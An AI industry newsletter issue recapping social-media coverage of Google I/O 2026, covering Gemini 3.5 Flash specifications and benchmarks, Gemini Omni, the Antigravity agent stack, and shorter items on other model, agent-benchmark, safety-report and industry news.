---
id: MjAyNS0x
title: 'Google I/O 2026: Gemini 3.5 Flash, Omni, and Google’s Agent Stack'
date: '2026-05-18T05:44:39.731046Z'
description: >-
  **Google** announced at I/O the repositioning of **Gemini** as a consumer AI
  and developer/agent platform with three key releases: **Gemini 3.5 Flash** for
  fast agentic and coding tasks, **Gemini Omni** for multimodal generation and
  editing including video, and the expanded **Antigravity 2.0** agent stack.
  Google reports processing over **3.2 quadrillion tokens per month**, a 7x
  increase year-over-year, with **900M+ monthly Gemini users** across 230+
  countries and 70+ languages. Gemini 3.5 Flash features a **1M-token context
  window**, **65k max output tokens**, **4 thinking levels**, and "thought
  preservation" across turns, outperforming Gemini 3.1 Pro on multiple
  benchmarks and running up to 12x faster in Antigravity. Independent benchmarks
  show Gemini 3.5 Flash scoring **55 on the Intelligence Index**, with higher
  costs than previous versions. Gemini Omni Flash supports text, image, video,
  and audio inputs for generative media tasks, available now for paid users.
companies:
  - google
  - google-deepmind
  - geminiapp
models:
  - gemini-3.5-flash
  - gemini-3.1-pro
  - gemini-3.5
  - gemini-omni
topics:
  - agentic-ai
  - multimodality
  - video-generation
  - model-performance
  - benchmarking
  - context-windows
  - model-optimization
  - model-scaling
  - instruction-following
  - api
  - model-efficiency
  - cost-analysis
people:
  - philschmid
  - jeffdean
---



**Google is so back!**

> AI News for 5/18/2026-5/19/2026. We checked 12 subreddits, [544 Twitters](https://twitter.com/i/lists/1585430245762441216) and no further Discords. [AINews' website](https://news.smol.ai/) lets you search all past issues. As a reminder, [AINews is now a section of Latent Space](https://www.latent.space/p/2026). You can [opt in/out](https://support.substack.com/hc/en-us/articles/8914938285204-How-do-I-subscribe-to-or-unsubscribe-from-a-section-on-Substack) of email frequencies!




---

# AI Twitter Recap

**Top Story: Google I/O recap and new Gemini technical details**


## What happened

**Google used I/O to reposition Gemini as both a consumer AI surface and a developer/agent platform, with three core technical announcements: Gemini 3.5 Flash for fast agentic/coding workloads, Gemini Omni for multimodal generation/editing starting with video, and a broader Antigravity agent stack spanning desktop/CLI/SDK/API.** Official posts emphasized scale — Google says it now processes **over 3.2 quadrillion tokens/month**, up **7x YoY** from **480T/month**, while the Gemini app has **900M+ monthly users** and is available in **230+ countries and 70+ languages** ([Google](https://x.com/Google/status/2056783102085640252), [Google](https://x.com/Google/status/2056783643381543253), [GeminiApp](https://x.com/GeminiApp/status/2056799446684578250)). The most technically substantive release was **Gemini 3.5 Flash**, framed by Google as its strongest agentic/coding model yet, **GA immediately**, with **1M-token context**, **65k max output**, **4 thinking levels** (“minimal/low/medium/high”), and “thought preservation” across turns ([GoogleDeepMind](https://x.com/GoogleDeepMind/status/2056787987774816525), [Google](https://x.com/Google/status/2056788266872140232), [_philschmid](https://x.com/_philschmid/status/2056794978517750165)). Google paired that with **Gemini Omni**, a new family combining Gemini reasoning with generative media, initially via **Omni Flash**, capable of taking **text/image/video/audio inputs** and producing video edits/generation in Gemini, Flow, Shorts, and later APIs ([GoogleDeepMind](https://x.com/GoogleDeepMind/status/2056786446636212467), [Google](https://x.com/Google/status/2056786781992071172), [GeminiApp](https://x.com/GeminiApp/status/2056800579159216202)). Around those models, Google launched or expanded **Antigravity 2.0 desktop**, **CLI**, **SDK**, **Managed Agents in the Gemini API**, Search-native generative UI/coding, **Gemini Spark** background agents on cloud VMs, and a long list of Gemini-app/Workspace/commerce/media integrations ([Google](https://x.com/Google/status/2056789045548896516), [Google](https://x.com/Google/status/2056838495298367773), [Google](https://x.com/Google/status/2056791134295273554)).


## Facts vs. opinions

### Facts / directly claimed by official or third-party benchmark sources
- Google says it now processes **3.2 quadrillion tokens/month**, up from **480 trillion** a year earlier ([Google](https://x.com/Google/status/2056783102085640252)).
- Google says Gemini has **900M+ monthly users** ([Google](https://x.com/Google/status/2056783643381543253)).
- Google says Gemini 3.5 Flash is **GA today** across Gemini app, Search AI Mode, Gemini API, AI Studio, Antigravity, Android Studio, and enterprise surfaces ([Google](https://x.com/Google/status/2056791527314387208), [GeminiApp](https://x.com/GeminiApp/status/2056789742910595342)).
- Google says Gemini 3.5 Flash has **1M context**, **65k max output**, **4 thinking levels**, and “thought preservation” across turns ([ _philschmid](https://x.com/_philschmid/status/2056794978517750165)).
- Google says 3.5 Flash beats Gemini 3.1 Pro on **Terminal-Bench 2.1**, **GDPval-AA**, and **MCP Atlas** ([GoogleDeepMind](https://x.com/GoogleDeepMind/status/2056787990110994511), [Google](https://x.com/Google/status/2056788281317306466)).
- Google says 3.5 Flash runs **4x faster than comparable frontier models**, and **up to 12x faster in Antigravity** ([Google](https://x.com/Google/status/2056788266872140232), [JeffDean](https://x.com/JeffDean/status/2056793419033588091)).
- Independent benchmarker Artificial Analysis reports Gemini 3.5 Flash scores **55** on its Intelligence Index, **+9 vs Gemini 3 Flash**, at **>280 output tok/s**, with **MMMU-Pro 84%**, **GDPval-AA Elo 1656**, and pricing of **$1.50 / $9.00 per 1M input/output tokens**; it also reports the model is **5.5x costlier** to run than Gemini 3 Flash on its suite and **75% costlier than Gemini 3.1 Pro** ([ArtificialAnlys](https://x.com/ArtificialAnlys/status/2056795055512596817)).
- Arena reports Gemini 3.5 Flash reached **#9 overall in Text Arena** and **#9 in Code Arena: Frontend**, scoring **1507**, a **+70** jump over Gemini 3 Flash, and becoming the top score in its price tier ([arena](https://x.com/arena/status/2056793176720195693)).
- Google says Gemini Omni Flash is available in Gemini/Flow today for paid users, in Shorts/Create starting this week for free, and via APIs in coming weeks ([Google](https://x.com/Google/status/2056789307856462061)).
- Google says Spark runs on **dedicated Google Cloud virtual machines**, allowing long-running tasks while user devices are closed ([Google](https://x.com/Google/status/2056791134295273554)).
- Google claims an Antigravity + Gemini 3.5 Flash demo built a functioning OS in **12 hours** using **93 parallel sub-agents**, **15k+ model requests**, **2.6B tokens**, and **< $1K** API credits ([Google](https://x.com/Google/status/2056789235500466273)).
- Google says Search will use Antigravity + 3.5 Flash to generate **custom visual tools/simulations** on the fly ([Google](https://x.com/Google/status/2056795269694423065)).

### Opinions / interpretations / skepticism
- Positive takes: “Google is back,” “insane evals for a Flash model,” “world model towards AGI,” “mind blowing” for Search + Antigravity, etc. ([kimmonismus](https://x.com/kimmonismus/status/2056791681073316071), [Kseniase_](https://x.com/Kseniase_/status/2056798225378783656), [demishassabis](https://x.com/demishassabis/status/2056831486251380783)).
- Neutral caution: some posters explicitly avoided overhyping due to **self-reported benchmarks** and noted pricing/perf concerns ([scaling01](https://x.com/scaling01/status/2056794370909593987), [simonw](https://x.com/simonw/status/2056867815605625172)).
- Negative/skeptical takes focused on:
  - **Price inflation** relative to earlier Flash models ([enricoros](https://x.com/enricoros/status/2056816088785289481)).
  - Comparisons where **GPT-5.5-medium** may be smarter/cheaper/faster end-to-end ([scaling01](https://x.com/scaling01/status/2056803273756000721), [scaling01](https://x.com/scaling01/status/2056798645983334890)).
  - Benchmark caveats such as weak **TerminalBench-Hard**, mediocre **MRCR / ARC-AGI-2**, or not clearly beating Kimi/GLM on some slices ([scaling01](https://x.com/scaling01/status/2056796392899645919), [teortaxesTex](https://x.com/teortaxesTex/status/2056794752167645653), [scaling01](https://x.com/scaling01/status/2056795648742076743)).
  - Product naming/UX confusion around Gemini CLI vs Antigravity CLI and broader interface design criticism ([zachtratar](https://x.com/zachtratar/status/2056848643580482002), [kchonyc](https://x.com/kchonyc/status/2056826706984337726), [teortaxesTex](https://x.com/teortaxesTex/status/2056788641926509010)).


## Gemini 3.5 Flash: the main technical release

### Official positioning
Google/DeepMind repeatedly described **Gemini 3.5 Flash** as the company’s strongest model yet for **agents and coding**, not its absolute flagship intelligence model. It’s meant to sit on the high-speed, high-utility part of the Pareto frontier, powering both Google products and developer workloads ([GoogleDeepMind](https://x.com/GoogleDeepMind/status/2056787987774816525), [Google](https://x.com/Google/status/2056788266872140232), [SundarPichai](https://x.com/sundarpichai/status/2056796893951426705)).

### Technical details and metrics
From Google and affiliated posts:
- **GA availability now** ([Google](https://x.com/Google/status/2056791527314387208))
- **1M token context window**
- **65k max output tokens**
- **Thinking levels:** minimal, low, medium (**new default**), high
- **Thought preservation across multi-turn conversations**
- **Text output**
- Input modalities: **text, image, video, speech** per Artificial Analysis ([ _philschmid](https://x.com/_philschmid/status/2056794978517750165), [ArtificialAnlys](https://x.com/ArtificialAnlys/status/2056795055512596817))
- Pricing: **$1.50 / 1M input**, **$9.00 / 1M output**, **90% discount on cached input** ([scaling01](https://x.com/scaling01/status/2056793465715822720), [ArtificialAnlys](https://x.com/ArtificialAnlys/status/2056795055512596817))

Official benchmark claims:
- **Terminal-Bench 2.1:** **76.2%**
- **GDPval-AA:** **1656 Elo**
- **MCP Atlas:** **83.6%**
- Google-quoted multimodal result: **MMMU-Pro 83.6%** in one engineer post; Artificial Analysis reports **84%**, highest recorded on its setup ([koraykv](https://x.com/koraykv/status/2056795667088204234), [ArtificialAnlys](https://x.com/ArtificialAnlys/status/2056795055512596817))

Speed claims:
- Google marketing claim: **4x faster than comparable frontier models** ([Google](https://x.com/Google/status/2056788266872140232))
- In Antigravity, Google says it is **up to 12x faster** ([JeffDean](https://x.com/JeffDean/status/2056793419033588091), [scaling01](https://x.com/scaling01/status/2056790573961326680))
- Artificial Analysis observed **>280 output tok/s**
- Some discussion cited **~867 tok/s** in Antigravity-specific optimized serving ([scaling01](https://x.com/scaling01/status/2056790573961326680), [scaling01](https://x.com/scaling01/status/2056791726677782743))

Third-party evaluation:
- Artificial Analysis says 3.5 Flash is the **leader on the intelligence-vs-speed Pareto frontier**, but the economics are notably worse than prior Flash:
  - Intelligence Index **55**
  - **+9** over Gemini 3 Flash
  - Hallucination rate reduced to **61%**, a **31-point drop** vs Gemini 3 Flash on its omniscience setup
  - **GDPval-AA 1656 Elo**
  - **5.5x** costlier than Gemini 3 Flash to run on its benchmark suite
  - **75%** costlier than Gemini 3.1 Pro on the same suite ([ArtificialAnlys](https://x.com/ArtificialAnlys/status/2056795055512596817))

Arena:
- **#9 Text Arena**
- **#9 Code Arena: Frontend**
- **1507** score, **+70** over Gemini-3 Flash
- Better than Gemini 3.1 Pro across categories in its frontend coding eval ([arena](https://x.com/arena/status/2056793176720195693), [arena](https://x.com/arena/status/2056803661859479812))

### Implications
The notable shift is that Google appears to be using a “Flash” label for a model that, in prior cycles, would have been described more like a **high-end product model optimized for deployment** rather than simply a cheap lightweight tier. Several posters called this out directly, arguing Flash is becoming more expensive and possibly absorbing former Pro territory ([enricoros](https://x.com/enricoros/status/2056816088785289481), [simonw](https://x.com/simonw/status/2056867815605625172)).

The strongest technical signal is not “best absolute benchmark model,” but:
1. **material agentic gains**
2. **extreme serving speed**
3. **deep integration into product surfaces**
4. **tooling built around subagents and long-horizon execution**

That makes 3.5 Flash strategically important even if some competitors still win on raw price-adjusted intelligence in certain third-party comparisons.


## Gemini Omni: multimodal generation/editing as “create anything from any input”

### What Google announced
Google introduced **Gemini Omni** as a new family merging Gemini reasoning/world knowledge with Google’s generative media stack, starting with **video** creation and editing. Official messaging described it as “create anything from any input,” but current rollout is narrower:
- Inputs: **text, images, audio, video**
- Initial output emphasis: **video**
- Product availability: **Gemini app**, **Flow**, **YouTube Shorts/Create**, later **APIs**
- Current shipping model: **Gemini Omni Flash** ([GoogleDeepMind](https://x.com/GoogleDeepMind/status/2056786446636212467), [Google](https://x.com/Google/status/2056786395067552140), [Google](https://x.com/Google/status/2056789307856462061))

Google/DeepMind claims:
- Better **world understanding**
- More robust **physics**
- Multi-turn editing where scene/character consistency is retained
- Ability to “reimagine” user video footage with conversational edits ([Google](https://x.com/Google/status/2056786888930062369), [Google](https://x.com/Google/status/2056786589175677089))

Rollout specifics:
- Paid Gemini users globally in app/Flow “today”
- YouTube Shorts/Create rolling out “starting this week” at no cost
- APIs for developers/enterprise in coming weeks ([Google](https://x.com/Google/status/2056789307856462061), [GeminiApp](https://x.com/GeminiApp/status/2056814117047132301))

### Perspectives
- Supportive: users and Google employees described Omni as a major quality step, especially for **video editing** and consistency ([joshwoodward](https://x.com/joshwoodward/status/2056827449556845051), [fofrAI](https://x.com/fofrAI/status/2056789242274259242), [osanseviero](https://x.com/osanseviero/status/2056863263305105424)).
- Strategic interpretation: several posters framed Omni as evidence Google is investing in **world models** and embodied/physical priors, not just text/code competition ([demishassabis](https://x.com/demishassabis/status/2056831486251380783), [jparkerholder](https://x.com/jparkerholder/status/2056789448554062232), [kimmonismus](https://x.com/kimmonismus/status/2056802929957568881)).
- Skepticism: some UI/output examples drew criticism for looking like “B-tier video game interface” or too polished/template-like ([teortaxesTex](https://x.com/teortaxesTex/status/2056787895977980172), [shlomifruchter](https://x.com/shlomifruchter/status/2056858151987884087)).

### Context
Omni matters less as “yet another video model” and more as Google’s attempt to unify:
- multimodal understanding,
- media editing,
- world grounding,
- agent interfaces,
- and eventually any-input/any-output generation.

This aligns with DeepMind’s long-running world-model agenda and Google’s product distribution advantage.


## Antigravity: Google’s agent OS, not just a coding assistant

A major underappreciated I/O theme was that Google is no longer presenting agents as a thin wrapper around a chat model. Antigravity is becoming the **execution substrate**.

### What launched / expanded
- **Antigravity 2.0 desktop app**: agent-first desktop with core conversations, artifacts, multi-agent orchestration ([Google](https://x.com/Google/status/2056788868092006891), [Google](https://x.com/Google/status/2056838653855650286))
- **Antigravity CLI** ([Google](https://x.com/Google/status/2056789045548896516), [Google](https://x.com/Google/status/2056841217611366570))
- **Antigravity SDK** ([Google](https://x.com/Google/status/2056789045548896516))
- **Managed Agents in Gemini API**: single API call gives an agent plus hosted Linux sandbox; supports Bash/Python/Node, files, browsing, custom markdown-defined skills, repo/GCS mounts ([Google](https://x.com/Google/status/2056838495298367773), [GoogleAIStudio](https://x.com/GoogleAIStudio/status/2056836824686059616), [_philschmid](https://x.com/_philschmid/status/2056836567470362955))
- Integrations with **AI Studio**, **Android**, **Firebase**, **Workspace**, web ([Google](https://x.com/Google/status/2056789045548896516), [Google](https://x.com/Google/status/2056837910851449177))
- One-click export from **AI Studio to Antigravity** ([Google](https://x.com/Google/status/2056838913944424469))
- Native **Android app generation** in AI Studio / Android support in Antigravity ([Google](https://x.com/Google/status/2056838230591574098), [AndroidDev](https://x.com/AndroidDev/status/2056841786656711077))

### Technical signaling
Google’s own demos centered on **parallel sub-agents**, **hosted execution**, **high-frequency iterative loops**, and **artifact-oriented workflows**. Jeff Dean explicitly described 3.5 Flash as a strong engine for “deploy sub-agents that collaborate, run high-frequency iterative loops, and solve real-world problems at scale” ([JeffDean](https://x.com/JeffDean/status/2056793419033588091)).

The marquee proof point:
- OS built in **12h**
- **93** parallel sub-agents
- **15k+** requests
- **2.6B** tokens
- **< $1K** credits ([Google](https://x.com/Google/status/2056789235500466273))

Even if this is mostly a stage-managed benchmark/demo, it reveals the architecture Google wants developers to adopt: **many fast agents over one slow monolithic run**.

### Reactions
- Positive: this is Google’s answer to Codex/Claude Code/OpenClaw/Hermes-style workflows, with a stronger infra story ([iScienceLuvr](https://x.com/iScienceLuvr/status/2056792158988816767), [theo](https://x.com/theo/status/2056826014739890204)).
- Critical: branding and product sprawl remain confusing; some users aren’t sure whether they should use Gemini CLI or Antigravity CLI, and Google’s design choices drew complaints ([kchonyc](https://x.com/kchonyc/status/2056826706984337726), [zachtratar](https://x.com/zachtratar/status/2056848643580482002), [teortaxesTex](https://x.com/teortaxesTex/status/2056788641926509010)).


## Search, Gemini app, and consumer agents

### Search
Google announced a redesigned AI-powered Search box, multimodal query support, and the most ambitious consumer-facing move: **Search generating custom visual tools and simulations on the fly** using Antigravity + Gemini 3.5 Flash ([Google](https://x.com/Google/status/2056793802141044786), [Google](https://x.com/Google/status/2056795269694423065)).

It also previewed **information agents** in Search:
- persistent monitoring tasks
- web/news/social/real-time signals
- synthesized updates with links and actions
- rolling out to Pro/Ultra this summer ([Google](https://x.com/Google/status/2056794282502054066), [Google](https://x.com/Google/status/2056794675214700764))

This is a notable strategic shift: Search moves from retrieval/ranking to **background agentic monitoring + generated applets**.

### Gemini app
Consumer Gemini updates included:
- new “**Neural Expressive**” design language ([Google](https://x.com/Google/status/2056799862604046663))
- inline/instant **Gemini Live** voice ([Google](https://x.com/Google/status/2056800029688352988))
- **Daily Brief** personalized digest from inbox/calendar/tasks ([Google](https://x.com/Google/status/2056801159071883342), [GeminiApp](https://x.com/GeminiApp/status/2056800978343764238))
- **Gemini Spark** as a 24/7 personal AI agent on cloud VMs, checking with users before major actions ([Google](https://x.com/Google/status/2056791134295273554), [GeminiApp](https://x.com/GeminiApp/status/2056801918018564538))
- macOS app + upcoming Spark/voice desktop workflows ([Google](https://x.com/Google/status/2056802434303869118), [GeminiApp](https://x.com/GeminiApp/status/2056802363269329304))

### Pricing / subscriptions
Google introduced a new pricing ladder:
- new **$100/month** plan
- top-tier **Ultra cut from $250 to $200/month** ([Google](https://x.com/Google/status/2056792498287063370), [GeminiApp](https://x.com/GeminiApp/status/2056792679607103626))

This reads as a more aggressive bid for premium power users, especially coders and creators.


## Trust, provenance, and standards

Google pushed **SynthID** across Search, Gemini, Chrome, and hardware/media surfaces, and announced partnerships with **OpenAI, NVIDIA, Kakao, and ElevenLabs** to bring SynthID to their generated content ([Google](https://x.com/Google/status/2056787498676658576), [Google](https://x.com/Google/status/2056787749965799508)).

That is one of the more consequential standards moves from I/O:
- it gives Google a shot at owning part of the provenance layer for generative media;
- notably, OpenAI separately announced support for checking OpenAI-generated images via **SynthID watermark + C2PA credentials** ([OpenAI](https://x.com/OpenAI/status/2056793648571011232)).

This was less flashy than Omni/3.5 Flash, but likely more durable if provenance becomes mandatory infrastructure.


## Google’s science and world-model angle

Several I/O items reinforced that Google does not want to compete only on coding/chat:
- **Gemini for Science**: Literature Insights, Hypothesis Generation, Computational Discovery ([GoogleDeepMind](https://x.com/GoogleDeepMind/status/2056808869242826957), [Google](https://x.com/Google/status/2056809034494124118))
- **Nature** publication links around ERA / Co-Scientist ([GoogleResearch](https://x.com/GoogleResearch/status/2056797037426045105), [GoogleResearch](https://x.com/GoogleResearch/status/2056857494107062718))
- **Project Genie + Street View grounding**, using ~20 years of maps imagery to create interactive real-location simulations ([Google](https://x.com/Google/status/2056850758029464009), [poolio](https://x.com/poolio/status/2056796361987850705), [bilawalsidhu](https://x.com/bilawalsidhu/status/2056804315721843024))

This broader context explains why some observers interpreted Omni as “world-model progress” rather than just a content tool ([demishassabis](https://x.com/demishassabis/status/2056831486251380783), [jparkerholder](https://x.com/jparkerholder/status/2056798252264018232)).


## Different opinions

### Bullish / supportive
- Gemini 3.5 Flash viewed as a major leap for a speed-tier model, especially on agentic coding ([kimmonismus](https://x.com/kimmonismus/status/2056791681073316071), [SundarPichai](https://x.com/sundarpichai/status/2056796893951426705)).
- Search + Antigravity seen as potentially transformative because Google can deploy generated UI/tools at enormous scale ([Kseniase_](https://x.com/Kseniase_/status/2056798225378783656), [TheTuringPost](https://x.com/TheTuringPost/status/2056795871098913209)).
- Omni praised for editing quality and for hinting at a deeper world-model roadmap ([joshwoodward](https://x.com/joshwoodward/status/2056827449556845051), [kimmonismus](https://x.com/kimmonismus/status/2056802929957568881)).

### Skeptical / opposing
- Concern that Google is leaning on **self-reported benchmarks**, and independent comparisons still leave room for competitors ([scaling01](https://x.com/scaling01/status/2056794370909593987)).
- Concern that “Flash” is no longer cheap enough to justify the name; pricing has climbed sharply from prior Flash generations ([enricoros](https://x.com/enricoros/status/2056816088785289481), [simonw](https://x.com/simonw/status/2056867815605625172)).
- Some believed **GPT-5.5-medium** still dominates on a combined smart/cheap/latency basis ([scaling01](https://x.com/scaling01/status/2056803273756000721)).
- Some benchmark slices imply unevenness — e.g. poor TerminalBench-Hard or middling reasoning metrics despite strong agentic numbers ([scaling01](https://x.com/scaling01/status/2056796392899645919), [teortaxesTex](https://x.com/teortaxesTex/status/2056794752167645653)).

### Neutral / analytical
- Artificial Analysis gave the strongest balanced take: **excellent speed-intelligence frontier position**, **substantial agentic gains**, but materially **worse cost** than prior Flash and even higher than 3.1 Pro on their end-to-end suite ([ArtificialAnlys](https://x.com/ArtificialAnlys/status/2056795055512596817)).
- Arena’s data also supports a “real improvement, not just marketing” conclusion, especially for frontend/code tasks, without claiming category dominance ([arena](https://x.com/arena/status/2056793176720195693)).


## Why this matters

1. **Google now has a coherent deployment story.**  
   Earlier Gemini cycles often felt benchmark-heavy and product-fragmented. At I/O, Google tied model, infra, tools, APIs, consumer surfaces, and enterprise rollout together.

2. **The center of gravity is shifting from chatbot UX to agent execution.**  
   The important primitives were not just model IQ: they were **subagents, hosted sandboxes, long-running tasks, generated artifacts, and integration with Search/Workspace/Android**.

3. **Gemini 3.5 Flash suggests “fast enough to orchestrate many agents” may matter more than max benchmark score.**  
   For coding and tool use, throughput and latency are increasingly product-defining.

4. **Omni reveals Google’s differentiation thesis.**  
   Google is betting on multimodal/world-grounded systems rather than purely text-centric competition.

5. **Trust/provenance is becoming platform infrastructure.**  
   SynthID partnerships with OpenAI/NVIDIA/ElevenLabs/Kakao suggest some convergence around content-auth provenance layers.

6. **The biggest unresolved question is economics.**  
   Technically strong or not, 3.5 Flash drew substantial pushback on cost inflation. If “Flash” is no longer the cheap workhorse tier, Google may win on capability deployment while losing some developer mindshare on predictability and pricing simplicity.


**Models, Benchmarks, and Inference**  

- **Cerebras** said it is running **Kimi K2.6**, described as a **trillion-parameter model**, at about **1,000 tok/s** in enterprise trials; Artificial Analysis benchmark context was cited as “fastest frontier model performance ever measured” ([cerebras](https://x.com/cerebras/status/2056778123329274279)).  
- **Cerebras architecture discussion:** a clip highlighted speed as primarily a **memory-bandwidth** problem, with model layers split across wafers to avoid external-memory fetches ([MTSlive](https://x.com/MTSlive/status/2056840697547039026)).  
- **Carbon**, an open DNA foundation model family from Hugging Face contributors, was released with unusually detailed technical notes: **Carbon-3B** reportedly matches **Evo2-7B** while running **250–275x faster** at inference, trained on **1T tokens**, using **deterministic 6-mer tokens**, **RMSNorm + SwiGLU + RoPE + GQA**, plus a mid-training switch to a **factorized loss (FNS)** to avoid late-training instability ([LoubnaBenAllal1](https://x.com/LoubnaBenAllal1/status/2056771927570530475), [lvwerra](https://x.com/lvwerra/status/2056774820872831234), [_lewtun](https://x.com/_lewtun/status/2056779013801349310)).  
- **Unsloth Studio** added **auto speculative decoding** and **MTP support for GGUFs**, claiming up to **2x faster inference** with no accuracy loss ([danielhanchen](https://x.com/danielhanchen/status/2056777199798440400)).  
- A new paper argued **RoPE has intrinsic long-context limitations**, not just engineering issues: in long contexts it may fail to distinguish both token identity and position, with implications for list-index retrieval and agent framework design ([haopeng_uiuc](https://x.com/haopeng_uiuc/status/2056780781930860699)).  
- Another optimizer paper proposed a **symmetry-compatible optimizer stack** with specialized updates for embeddings, LM heads, SwiGLU MLPs, and MoE routers ([timlautk](https://x.com/timlautk/status/2056783702441730372)).


**Agents, Benchmarks, and Harnesses**  

- **NanoGPT-Bench** was released as an AI R&D benchmark based on the NanoGPT Speedrun. Authors claim current coding/research agents recover only **9.3% of human progress**, mostly via hyperparameter tuning rather than algorithmic insights; evaluation is **fully autonomous**, **offline**, and constrained to a **5-month world-record window** to reduce contamination ([IntologyAI](https://x.com/IntologyAI/status/2056764236668493868)).  
- A long survey on **code-as-agent harnesses** argued future agent systems need to be **executable, inspectable, stateful, and governed** ([omarsar0](https://x.com/omarsar0/status/2056764334181884158)).  
- **Vibrant Labs** highlighted verifier quality as the key bottleneck in scalable agent benchmarks, citing **SWE-bench Verified**, **OSWorld-Verified**, **ComputerRL**, and **BenchGuard** ([Shahules786](https://x.com/Shahules786/status/2056773476585816255)).  
- **LangChain/LangSmith Engine** discussion focused on long-horizon eval difficulty and ambient analysis of long traces; multiple team members framed Engine as one of the more complex production agent systems in the wild ([LangChain](https://x.com/LangChain/status/2056787294124667293), [hwchase17](https://x.com/hwchase17/status/2056789174800547917), [BraceSproul](https://x.com/BraceSproul/status/2056821182549442971)).  
- **Databricks research** introduced **MemEx**, a programmable Python scratchpad for agents that keeps typed objects in a live kernel instead of flooding context windows. Reported gains across enterprise tasks: frontier models improve **2–5 accuracy points at 25–30% lower cost**, while Qwen models nearly double accuracy at **40–50% lower cost** ([DbrxMosaicAI](https://x.com/DbrxMosaicAI/status/2056818063215878618)).  
- **Cursor** added Jira integration to kick off cloud agents directly from work items ([cursor_ai](https://x.com/cursor_ai/status/2056803731367456993)).  
- **GitHub** began rolling out **Gemini 3.5 Flash** in Copilot, emphasizing tool use, speed, and cache efficiency for iterative coding workflows ([github](https://x.com/github/status/2056801675042779279)).  
- **Claude** published best practices for productionizing computer use, including click accuracy, effort levels, context management, and demonstration replay ([ClaudeDevs](https://x.com/ClaudeDevs/status/2056835339193561170)).


**Safety, Risk, and Governance**  

- **METR** released its first **Frontier Risk Report**, based on access to internal models/info from **Anthropic, Google, Meta, and OpenAI**, including CoT access and private protocol review. The report focuses on loss-of-control and covert-capability risks in internal agents ([METR_Evals](https://x.com/METR_Evals/status/2056800023149760666), [ajeya_cotra](https://x.com/ajeya_cotra/status/2056800135670338043)).  
- **David Rein** described an embedded exercise at Anthropic stress-testing monitoring systems for rogue internal agents; he noted Anthropic retained redaction discretion, so he frames it as an “exercise” rather than a full audit ([idavidrein](https://x.com/idavidrein/status/2056800422422265897), [idavidrein](https://x.com/idavidrein/status/2056800666832838780)).  
- **Guidelight**, a new AI safety standards org founded by ex-OpenAI researchers, launched its first two standards ([sjgadler](https://x.com/sjgadler/status/2056762703033807068)).  
- Several commentary threads argued frontier labs’ internal monitoring of agents is becoming a serious new security/control field, but evidence remains early and capacity for third-party audits is limited ([ChrisPainterYup](https://x.com/ChrisPainterYup/status/2056803418602426407), [neev_parikh](https://x.com/neev_parikh/status/2056801754122273093)).


**Industry Moves and Infrastructure**  

- **Andrej Karpathy joined Anthropic**, the dominant non-Google/O I/O story in the feed. Karpathy’s own note was minimal and personal ([karpathy](https://x.com/karpathy/status/2056753169888334312)); subsequent speculation centered on **RSI / autoresearch / pretraining** roles ([scaling01](https://x.com/scaling01/status/2056773883982762114), [scaling01](https://x.com/scaling01/status/2056771657553920254)).  
- **OpenAI** launched **Guaranteed Capacity**, offering customers long-term reserved compute access with 1–3 year commitments as demand stays capacity-constrained ([OpenAI](https://x.com/OpenAI/status/2056823271774101907), [sama](https://x.com/sama/status/2056827105401614656)).  
- **Thinking Machines Lab** announced grants of **$100,000 + Tinker credits** for human-AI interactivity research ([thinkymachines](https://x.com/thinkymachines/status/2056786920836145410)).  
- **Heron Power** published an **800V DC data center** blueprint for a **12 MW** AI factory block, claiming **1/3 MV-to-rack electrical cost**, **1/10 installation labor**, and **half the grid-to-chip inefficiency** of conventional 480 VAC builds ([baglino](https://x.com/baglino/status/2056805824685842872)).  
- **John Carmack** posted a strong infra/systems rant on the lack of a good OS/network primitive for “write really_big_buffer and it is all taken care of,” criticizing tradeoffs around TCP and QUIC ([ID_AA_Carmack](https://x.com/ID_AA_Carmack/status/2056780156535279812)).


**Applied AI, Media, and Product Launches**  

- **fal** launched **Mirelo SFX 1.6** for video-to-synced sound effects, audio inpainting, and extension, plus **Avatar V** for identity-consistent studio-quality avatar video from a 15-second recording ([fal](https://x.com/fal/status/2056769877021520039), [fal](https://x.com/fal/status/2056785566482456584)).  
- A thread on **voice cloning as style transfer** argued popular systems systematically make voices sound warmer, more authoritative, and more “native English,” with listeners trusting the clones more than original speakers ([KaitlynZhou](https://x.com/KaitlynZhou/status/2056775499297513563)).  
- **Edison Scientific / Incyte** claims around production AI for pharma were notable but entirely vendor-reported: “reads **1,500 papers** and writes **42,000 lines of code** in a single run,” with **79% reproducibility** and full-pipeline deployment ([kimmonismus](https://x.com/kimmonismus/status/2056760942378266763)).  
- **Google** also announced consumer-facing non-core-AI products at I/O including intelligent eyewear partnerships, Google Pics, Stitch updates, and agentic commerce protocols, but these were less technically substantive than the Gemini/Antigravity stack ([Google](https://x.com/Google/status/2056805831237386360), [Google](https://x.com/Google/status/2056803288096690446), [Google](https://x.com/Google/status/2056803725214404634)).

**Google I/O 2026: Gemini 3.5 Flash, Omni, and Google’s Agent Stack**

- **Gemini 3.5 Flash launch**: Google’s biggest technical release was **[Gemini 3.5 Flash](https://x.com/Google/status/2056788266872140232)**, positioned as its strongest model yet for **agents and coding**. Google claims it is **4x faster than comparable frontier models** and often **less than half the cost**, while beating **Gemini 3.1 Pro** on benchmarks including **Terminal-Bench 2.1, GDPval-AA, and MCP Atlas** in posts from [Google](https://x.com/Google/status/2056788281317306466) and [Google DeepMind](https://x.com/GoogleDeepMind/status/2056787990110994511). The model is now rolling out broadly across the **Gemini app, Search AI Mode, Gemini API, AI Studio, Antigravity, and enterprise surfaces** per [Google](https://x.com/Google/status/2056791527314387208), with **Gemini 3.5 Pro coming next month** per [Google DeepMind](https://x.com/GoogleDeepMind/status/2056794514564751490).
- **Independent benchmarking paints a more nuanced picture**: [Artificial Analysis](https://x.com/ArtificialAnlys/status/2056795055512596817) says 3.5 Flash is now on the **speed–intelligence Pareto frontier**, scoring **55** on its Intelligence Index, up **9 points** over Gemini 3 Flash, with notable gains on **agentic evals** and **hallucination reduction**. It also reports **>280 output tok/s**, **MMMU-Pro 84%**, and a strong **GDPval-AA Elo of 1656**. However, this comes with a major cost increase: **$1.50 / $9 per million input/output tokens**, making it **5.5x more expensive** to run AA’s benchmark suite than Gemini 3 Flash and **75% more expensive than Gemini 3.1 Pro**. Community reactions from [@arena](https://x.com/arena/status/2056793176720195693) also highlighted a strong **Code Arena: Frontend** result (#9 overall, +70 points over Gemini 3 Flash), though others noted weaker-than-expected performance on some coding subsets like TerminalBench-Hard.
